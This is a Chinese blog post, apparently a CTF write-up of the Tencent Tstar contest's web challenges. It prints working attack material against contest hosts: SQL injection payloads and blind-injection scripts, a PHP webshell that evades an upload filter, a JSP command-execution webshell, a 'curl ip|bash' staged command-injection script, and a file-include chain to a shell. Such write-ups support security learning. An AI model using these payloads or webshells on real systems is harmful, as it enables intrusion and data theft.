@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="腾讯Tstar高校挑战赛 Writeup"><meta name="keywords" content=""><meta name="author" content="Neorah"><meta name="copyright" content="Neorah"><title>腾讯Tstar高校挑战赛 Writeup | Neorah's Blog</title><link rel="shortcut icon" href="/img/melody-favicon32.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"DBINOT6FYU","apiKey":"c9a16d407275792c2b0577f2e8765356","indexName":"dev_Neorah","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#签到"><span class="toc-number">2.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#命令执行基础"><span class="toc-number">3.</span> <span class="toc-text">命令执行基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#你能爆破吗"><span class="toc-number">4.</span> <span class="toc-text">你能爆破吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含getshell"><span class="toc-number">6.</span> <span class="toc-text">文件包含getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#成绩单"><span class="toc-number">7.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小猫咪踩灯泡"><span class="toc-number">8.</span> <span class="toc-text">小猫咪踩灯泡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析代码获得flag"><span class="toc-number">9.</span> <span class="toc-text">分析代码获得flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql1"><span class="toc-number">10.</span> <span class="toc-text">sql1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql2"><span class="toc-number">11.</span> <span class="toc-text">sql2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预期解"><span class="toc-number">11.0.1.</span> <span class="toc-text">预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if"><span class="toc-number">11.0.1.1.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正则匹配"><span class="toc-number">11.0.1.2.</span> <span class="toc-text">正则匹配</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期解"><span class="toc-number">11.0.2.</span> <span class="toc-text">非预期解</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/neorah.jpg"></div><div class="author-info__name text-center">Neorah</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Neorah" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">33</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">33</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Neorah's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Posts</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">腾讯Tstar高校挑战赛 Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-01</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">1.9k</span><span class="post-meta__separator">|</span><span>Reading time: 7 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这场比赛是昨天Tstar的靶场赛，由于整个比赛主线是渗透测试，所以这几个题比较简单。但有两个sql我还是没有做出来5555。</p>
+<img src="/Tstar/1.png" class="">
+
+<p>看了别的师傅的wp后，又学到了新知识👍🏻。</p>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>比较简单，就是上传木马时抓包改后缀就好了。</p>
+<p>连接就好了。</p>
+<img src="/Tstar/2.png" class="">
+
+<h1 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h1><img src="/Tstar/3.png" class="">
+
+<p>没有什么过滤，所以直接执行找flag就好了。</p>
+<h1 id="你能爆破吗"><a href="#你能爆破吗" class="headerlink" title="你能爆破吗"></a>你能爆破吗</h1><p>看这个题目一开始我以为是爆破？然后就丢给burp跑了下，结果发现密码就是admin，打扰惹。</p>
+<p>然后在response里看到了set-cookie，回页面看看。</p>
+<img src="/Tstar/4.png" class="">
+
+<p>发现cookie为<code>uname=YWRtaW4%3D</code>，解码看了下就是admin。</p>
+<p>并且这个页面还给了查询语句为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">"admin"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>那就是cookie注入惹。所以把注入语句base64编码后替换掉cookie就好了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,2,3 #</span><br></pre></td></tr></table></figure>
+
+<p>看到回显位后就可以注入了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,(group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),user()#</span><br></pre></td></tr></table></figure>
+
+<p>表名为flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;flag&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>查flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,flag,3 from flag#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>这道题把俺坑了，害得我做了好久。</p>
+<p>下次我必定先fuzz一下什么会被过滤- -</p>
+<p>这道题主要就是在检测替换了<code>&lt;?</code>、<code>php</code>、<code>eval</code>，因此双写绕过就可以了。</p>
+<p>所以我们上传图片后抓取请求包，检测了内容大小，所以直接在图片内容里添加木马就好了。</p>
+<p>构造的内容为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;??phphpp evevalal($_GET[&#39;hhhh&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者（主要一开始没发现替换了eval…如果使用这个办法就没事了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;??phphpp system(&#39;ls &#x2F;&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后修改文件名后缀为<code>.pht</code>上传就可以了。</p>
+<h1 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h1><img src="/Tstar/5.png" class="">
+
+<p>提示了LFI，点进去是lfi.php，那大概就是本地文件包含漏洞了8.</p>
+<p>注释里提示了lfi.txt，进去看到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">''</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">"%s.php"</span>, $file); <span class="comment">// only php file can be included</span></span><br><span class="line">    <span class="keyword">include</span>($inc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>果然是了。</p>
+<p>上传的时候只能上传txt文件，并且从源码中可以看出在文件后加了.php。所以我们可以利用<code>phar://</code>、<code>zip://</code>协议读取。</p>
+<p>把shell.php打包成zip，再改后缀为txt上传。</p>
+<img src="/Tstar/6.png" class="">
+
+<p>上传成功了。试试能不能用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;966ca955.yunyansec.com&#x2F;lfi.php?file&#x3D;phar:&#x2F;&#x2F;files&#x2F;nhqUchi0zQtA0 APg.txt&#x2F;shell2&amp;hhhh&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<img src="/Tstar/7.png" class="">
+
+<p>然后连接shell就阔以了。</p>
+<h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><p>直接用sqlmap跑就可以了。</p>
+<h1 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h1><p>这道题本来是有难度的？但是出题人非常好心地再题目描述中给了cve编号。</p>
+<img src="/Tstar/8.png" class="">
+
+<p>然后就百度到了。</p>
+<p>思路大概就是利用HTTP PUT请求方法，将构造好的jsp文件传到服务器上，jsp文件中的恶意代码被服务器执行，进而获取到服务器权限。</p>
+<p>用burp抓包，先看看被允许的请求方式：</p>
+<img src="/Tstar/9.png" class="">
+
+<p>允许PUT，那么我们就可以用PUT上传jsp包了：</p>
+<img src="/Tstar/10.png" class="">
+
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">excuteCmd</span><span class="params">(String c)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">StringBuilder line = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(pro.getInputStream()));</span><br><span class="line"> </span><br><span class="line">String temp = <span class="keyword">null</span>;<span class="keyword">while</span> ((temp = buf.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">line.append(temp+<span class="string">"\n"</span>);&#125;buf.close();&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> </span><br><span class="line">line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">"666"</span>.equals(request.getParameter(<span class="string">"pwd"</span>))&amp;&amp;!<span class="string">""</span>.equals(request.getParameter(<span class="string">"cmd"</span>)))&#123;</span><br><span class="line"> </span><br><span class="line">out.println(<span class="string">"&lt;pre&gt;"</span>+excuteCmd(request.getParameter(<span class="string">"cmd"</span>))+<span class="string">"&lt;/pre&gt;"</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">":-)"</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/Tstar/11.png" class="">
+
+<p>成功上传。试试执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3d0706f0.yunyansec.com&#x2F;shell1.jsp?cmd&#x3D;ls%20&#x2F;&amp;pwd&#x3D;666</span><br></pre></td></tr></table></figure>
+
+<p>然后找flag文件读取就好了。</p>
+<h1 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  error_reporting(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>六字符限制getshell</p>
+<p>可以参考🌟🌟的这篇<a href="https://x5tar.com/2020/04/18/bypass-char-number-limit/" target="_blank" rel="noopener">文章</a></p>
+<p>他写得真的很详细了，所以就不重新写了。</p>
+<p>顺便偷一波他的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shells = [</span><br><span class="line">    <span class="string">"&gt;ls\\"</span>,</span><br><span class="line">    <span class="string">"ls&gt;_"</span>,</span><br><span class="line">    <span class="string">"&gt;\ \\"</span>,</span><br><span class="line">    <span class="string">"&gt;-t\\"</span>,</span><br><span class="line">    <span class="string">"&gt;\&gt;v"</span>,</span><br><span class="line">    <span class="comment"># ls -t&gt;v</span></span><br><span class="line">    </span><br><span class="line">…  <span class="comment"># curl ip|bash 适当分割并逆向放置</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">"sh _"</span></span><br><span class="line">]</span><br><span class="line">url = <span class="string">"http://c3ee93c4.yunyansec.com/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shell <span class="keyword">in</span> shells:</span><br><span class="line">    print(shell)</span><br><span class="line">    r = requests.get(url, params=&#123;<span class="string">'1'</span>: shell&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>放在服务器上的命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ..&#x2F;key</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>sh v</code>即可得到flag</p>
+<p>噢对这道题还有个更简单的方法。</p>
+<p>先写入cat</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;cat</span><br></pre></td></tr></table></figure>
+
+<p>输入通配符<code>*</code>,linux会把第一个列出的文件名当作命令，剩下的文件名当作参数。</p>
+<p>然后看到flag所在文件在上一层</p>
+<img src="/Tstar/12.png" class="">
+
+<p>直接使用cat读取。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;* ..&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>就读到flag了。</p>
+<h1 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h1><p>终于到了众望所归的sql了，然而sql1零解，我实在不懂这道200分的零解题还能有多难的做法。等官方wp吧。</p>
+<h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>sql2我思路歪了呜呜。主要是sql1和sql2使用的是同一个网页，出题人说有两处flag。</p>
+<p>所以我以为是在两个注入点每处分别有一个flag。</p>
+<p>刚好这道题在登陆界面和picture界面有两处注入点，所以我一直以为他们是独立的。</p>
+<p>在登陆处怎么都没有回显，我也爆破了下也没有弱口令密码。所以靠心灵感应？？因为sql2有5解了，sql1还0解，所以我以为这个点是sql1的，因为太靠心灵感应了所以没人解出来。</p>
+<p>事实证明是我错了。登陆注入点得到的flag是sql2的…这道题是在picture处得到密码，然后拿到登陆界面去登陆，登陆进去就得到flag了。</p>
+<p>行8</p>
+<p>在做题的时候扫了下得到以下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SQL_DETECT</span><span class="params">($PictureId)</span></span>&#123;</span><br><span class="line">    $a0=urldecode(<span class="string">'%a0'</span>);</span><br><span class="line">    $PictureId=str_replace(<span class="string">'\d'</span>, <span class="string">''</span>, $PictureId);</span><br><span class="line">    $PictureId=str_replace($a0, <span class="string">''</span>, $PictureId);</span><br><span class="line">    $PictureId=str_replace(<span class="string">'\/\*.*?\*\/'</span>, <span class="string">''</span>, $PictureId);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/union|order.*by|and|\dor\d|\|\||sleep|BENCHMARK|substr|ascii|select|mid|right|left|right|substring|substring_index|INSTR|LOCATE/i'</span>, $PictureId))&#123;</span><br><span class="line"></span><br><span class="line">        $PictureId=<span class="string">'1'</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $PictureId;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤的比较死，然后我测试了下，用以下脚本爆出了数据库名。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://95f82c36.yunyansec.com/picture.php'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'1"^(ord(reverse(lpad(database(),&#123;&#125;,1)))&gt;&#123;&#125;)-- '</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = &#123;<span class="string">'id'</span>: payload1.format(i, mid)&#125;</span><br><span class="line">        r = s.get(url=url, params=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"found"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>跑出了数据库名为waf。</p>
+<p>然后因为过滤了select什么的，用了好几种办法都没有绕过呜呜呜，我就放弃惹。</p>
+<p>结束后看了下别人写的wp，tql5555</p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>先猜解存在的字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Picture.php?id&#x3D;0&quot; | if(ord(password),1,null) %23</span><br></pre></td></tr></table></figure>
+
+<p>如果存在 password 字段，则返回正常页面.</p>
+<p>我没想到直接猜解字段…谁知道他在里面会放这些字段呢- -学到了</p>
+<p>经过猜解后发现存在<code>username</code>、<code>password</code>、<code>id</code>、<code>picture</code>。所以password和图片都在同一个表里…就可以继续猜解username和password内容了。</p>
+<p>然后继续猜解</p>
+<p>这里有两个办法</p>
+<h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><a href="https://www.cnpanda.net/ctf/731.html#menu_index_5" target="_blank" rel="noopener">来源</a></p>
+<h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p><a href="https://0xfire.me/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">来源</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        url = <span class="string">'http://xxx.yunyansec.com/picture.php?id=3" or password REGEXP '</span>+<span class="string">'\'^'</span>+temp+i+<span class="string">'\' %23'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'not found'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+i</span><br><span class="line">            <span class="keyword">print</span> (temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>然后爆出用户名和密码后登陆就好了。</p>
+<p>顺便，这题是<a href="https://github.com/XDSEC/xdsec_ctf/tree/494b53d388186e8be21e753bb2048362842280c1/xdctf2015/izyCTF" target="_blank" rel="noopener">原题</a>。（手动微笑</p>
+<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>我还看到了个师傅直接用 <code>load_file</code>读源码，有点nb。本题作者讲他讲降权了的，所以才能这么用。</p>
+<p>并且这个路径不太难猜，根据以下payload写个脚本就读出来了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.159.170&#x2F;sql&#x2F;picture.php?id&#x3D;1&quot;^if(hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;))&lt;&quot;40&quot;,1,0)%23</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Neorah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://neorah.me/Tstar/">https://neorah.me/Tstar/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/ctf/%E6%9C%AA%E5%91%BD%E5%90%8D/"><span>ctf/未命名</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Neorah</div><div class="footer_custom_text">Theme By melody</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
